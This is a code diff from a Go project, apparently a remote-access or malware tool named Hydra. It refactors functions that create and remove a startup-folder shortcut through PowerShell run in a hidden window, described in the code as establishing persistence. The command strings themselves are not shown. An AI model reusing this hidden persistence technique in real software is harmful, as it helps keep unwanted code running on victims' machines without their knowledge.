@@ -1,11 +1,9 @@
 package install
 
 import (
-	"errors"
 	"fmt"
-	"os/exec"
-	"strings"
-	"syscall"
+
+	"github.com/Raffy27/Hydra/util"
 )
 
 const (
@@ -15,24 +13,11 @@ const (
 
 //TryFolderInstall attempts to establish persistence by creating a startup shortcut.
 func TryFolderInstall() error {
-	cmd := exec.Command("powershell", fmt.Sprintf(createCmd, "powershell.exe"))
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	out, err := cmd.CombinedOutput()
-
-	if strings.Contains(string(out), "FullyQualifiedErrorId") {
-		return errors.New("Failed to create shortcut")
-	}
-	return err
+	cmd := fmt.Sprintf(createCmd, "powershell.exe")
+	return util.RunPowershell(cmd)
 }
 
 //UninstallFolder attempts to remove the startup shortcut.
 func UninstallFolder() error {
-	cmd := exec.Command("powershell", removeCmd)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	out, err := cmd.CombinedOutput()
-
-	if strings.Contains(string(out), "FullyQualifiedErrorId") {
-		return errors.New("Failed to remove shortcut")
-	}
-	return err
+	return util.RunPowershell(removeCmd)
 }
